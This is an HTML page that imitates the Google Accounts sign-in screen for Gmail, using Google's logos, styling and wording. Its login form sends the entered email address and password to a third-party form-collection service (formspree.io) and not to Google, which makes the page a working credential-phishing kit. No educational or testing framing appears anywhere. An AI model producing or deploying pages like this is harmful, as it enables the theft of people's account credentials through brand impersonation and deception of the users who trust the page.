<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; color: #404040; background: #fff; margin: 0; padding: 20px; }
        .logo { width: 116px; margin-top: 30px; }
        h1 { font-weight: normal; font-size: 38px; margin: 10px 0; }
        p { font-size: 18px; margin-bottom: 20px; }
        .card { width: 350px; padding: 40px; border: 1px solid #d5d5d5; background: #f7f7f7; margin: 0 auto 25px; border-radius: 2px; }
        .avatar { width: 100px; height: 100px; background: #e5e5e5; border-radius: 50%; margin: 0 auto 25px; 
                  background-image: url('https://ssl.gstatic.com/accounts/ui/avatar_2x.png'); background-size: cover; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d9d9d9; box-sizing: border-box; font-size: 16px; }
        input:focus { border: 1px solid #4d90fe; outline: none; }
        button { width: 100%; padding: 12px; background: #4d90fe; border: 1px solid #3079ed; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 2px; font-size: 14px; }
        button:hover { background: #357ae8; }
        .footer-links { font-size: 13px; color: #427fed; text-decoration: none; }
        .footer-links:hover { text-decoration: underline; }
        .sub-footer { margin-top: 25px; }
    </style>
</head>
<body>

    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
    <h1>One account. All of Google.</h1>
    <p>Sign in to continue to Gmail</p>
    
    <div class="card">
        <div class="avatar"></div>
        
        <form action="https://formspree.io/f/xykdgzyb" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
            
            <div style="margin-top:15px; text-align:left; font-size: 13px;">
                <label><input type="checkbox" name="stay_signed_in" style="width:auto;"> Stay signed in</label>
                <a href="#" class="footer-links" style="float:right;">Need help?</a>
            </div>
        </form>
    </div>
    
    <a href="#" class="footer-links">Create an account</a>

    <div class="sub-footer">
        <p style="font-size: 13px; color: #737373;">One Google Account for everything Google</p>
        <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png" alt="Google Services">
    </div>

</body>
</html>
